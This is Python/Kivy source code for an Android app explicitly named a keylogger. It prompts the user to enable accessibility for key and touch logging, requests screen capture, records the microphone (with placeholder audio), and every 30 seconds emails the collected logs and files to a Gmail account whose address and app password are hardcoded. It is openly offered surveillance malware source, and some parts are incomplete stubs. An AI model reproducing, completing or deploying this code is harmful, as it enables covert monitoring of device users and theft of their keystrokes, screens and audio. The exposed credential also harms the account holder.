from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from jnius import autoclass, cast
import socket, platform, os, time, threading
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Config (Edit these)
EMAIL_SENDER = 'shivamandpandu@gmail.com'
EMAIL_PASSWORD = 'bmqa vxwn nqlh dgkb'  # App Password
RECIPIENT_EMAIL = 'shivamandpandu@gmail.com'
SEND_EVERY = 30  # Seconds

# Temp files
TEMP_LOG = '/sdcard/temp_log.txt'
TEMP_SS = '/sdcard/screenshot.png'
TEMP_MIC = '/sdcard/mic.wav'

PythonActivity = autoclass('org.kivy.android.PythonActivity')
Intent = autoclass('android.content.Intent')
Context = autoclass('android.content.Context')
AudioRecord = autoclass('android.media.AudioRecord')
AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
AudioFormat = autoclass('android.media.AudioFormat')
MediaProjectionManager = autoclass('android.media.projection.MediaProjectionManager')

class KeyLoggerApp(App):
    def build(self):
        self.logs = ["Android KeyLogger Started\n"]
        self.sys_info = self.get_info()
        self.logs.append(self.sys_info)
        Clock.schedule_interval(self.report, SEND_EVERY)
        Clock.schedule_once(self.start_accessibility, 1)  # Delay for UI
        return Label(text='KeyLogger Running...\n' + self.sys_info + '\n(Enable Accessibility in Settings!)')

    def get_info(self):
        h = socket.gethostname()
        ip = socket.gethostbyname(h)
        sys = platform.system()
        return f"Host: {h}\nIP: {ip}\nOS: {sys}\nTime: {time.ctime()}\n"

    # Key/Touch Logging (Calls AccessibilityService)
    def start_accessibility(self, dt):
        try:
            intent = Intent('android.settings.ACCESSIBILITY_SETTINGS')
            PythonActivity.mActivity.startActivity(intent)
            self.logs.append("[Accessibility Prompted - Enable for Key/Touch Logging]\n")
            # Interact with service: autoclass('org.example.YourAccessibilityService').logEvent("Started")
        except Exception as e:
            self.logs.append(f"[Accessibility Error: {e}]\n")

    # Screenshot (User grants via prompt)
    def take_screenshot(self):
        try:
            mpm = PythonActivity.mActivity.getSystemService(Context.MEDIA_PROJECTION_SERVICE)
            intent = mpm.createScreenCaptureIntent()
            PythonActivity.mActivity.startActivityForResult(intent, 100)
            self.logs.append("[Screenshot Prompted - Grant Permission]\n")
            return TEMP_SS  # Save actual image in callback (simplified)
        except Exception as e:
            self.logs.append(f"[Screenshot Error: {e}]\n")
            return None

    # Mic Recording (10s)
    def record_mic(self):
        try:
            sample_rate = 16000
            channel = AudioFormat.CHANNEL_IN_MONO
            format_ = AudioFormat.ENCODING_PCM_16BIT
            buffer_size = AudioRecord.getMinBufferSize(sample_rate, channel, format_)
            recorder = AudioRecord(AudioSource.MIC, sample_rate, channel, format_, buffer_size)
            recorder.startRecording()
            def stop_record():
                recorder.stop()
                recorder.release()
            threading.Timer(10, stop_record).start()
            # Simplified: Write dummy data; add loop for real bytes
            with open(TEMP_MIC, 'wb') as f:
                f.write(b'\x00' * buffer_size * 10)  # Placeholder
            self.logs.append("[Mic Recorded 10s]\n")
            return TEMP_MIC
        except Exception as e:
            self.logs.append(f"[Mic Error: {e}]\n")
            return None

    # Email Report with Attachments
    def send_report(self, body, files):
        files_to_attach = [f for f in files if f and os.path.exists(f)]
        msg = MIMEMultipart()
        msg['From'] = EMAIL_SENDER
        msg['To'] = RECIPIENT_EMAIL
        msg['Subject'] = f'Keylog Report - {socket.gethostname()}'
        msg.attach(MIMEText(body))
        for f in files_to_attach:
            with open(f, 'rb') as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(f)}')
            msg.attach(part)
        try:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465, ssl.create_default_context()) as s:
                s.login(EMAIL_SENDER, EMAIL_PASSWORD)
                s.sendmail(EMAIL_SENDER, RECIPIENT_EMAIL, msg.as_string())
            self.logs.append("[Email Sent Successfully]\n")
        except Exception as e:
            self.logs.append(f"[Email Error: {e} - Saved to file]\n")
            with open('/sdcard/log.txt', 'a') as f: f.write(body)
        # Cleanup
        for f in files_to_attach: os.remove(f)

    def report(self, dt):
        body = ''.join(self.logs)
        with open(TEMP_LOG, 'w') as f: f.write(body)
        files = [self.take_screenshot(), self.record_mic(), TEMP_LOG]
        self.send_report(body, files)
        self.logs = []

KeyLoggerApp().run()
